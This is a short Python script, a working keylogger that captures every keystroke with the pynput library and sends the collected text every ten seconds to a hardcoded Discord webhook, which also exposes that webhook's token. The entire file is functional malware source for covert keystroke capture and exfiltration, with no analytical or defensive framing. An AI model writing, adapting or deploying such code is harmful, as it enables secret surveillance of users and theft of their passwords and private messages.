from pynput import keyboard
import requests
import threading


text = ""
webhook_url = "https://discord.com/api/webhooks/1354862304818368753/00a1z0gP218HKXXcp2537RR0A635q3H5K0qIBviITk7XjJHsArVx2CadpC5q3WP1VS1f"
time_interval = 10

def send_data():
    data = {
        "content": text,
        'title': 'Keylogger'
        }
    requests.post(webhook_url, data=data)
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    if key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.backspace:
        if len(text) > 0:
            text = text[:-1]
        else:
            pass
    elif key == keyboard.Key.esc:
        return False
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        text += str(key).strip("'")


with keyboard.Listener(on_press=on_press) as listener:
    send_data()
    listener.join()
    
